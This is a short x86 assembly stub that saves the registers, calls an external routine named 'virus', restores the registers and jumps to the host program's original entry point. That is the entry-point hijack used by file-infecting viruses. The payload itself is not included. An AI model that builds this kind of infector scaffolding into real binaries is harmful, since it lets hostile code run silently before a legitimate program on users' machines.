.globl _start
.extern virus
.section ".text"
_start:		pusha
		call	virus
_recovery:	popa
		jmp	__entry
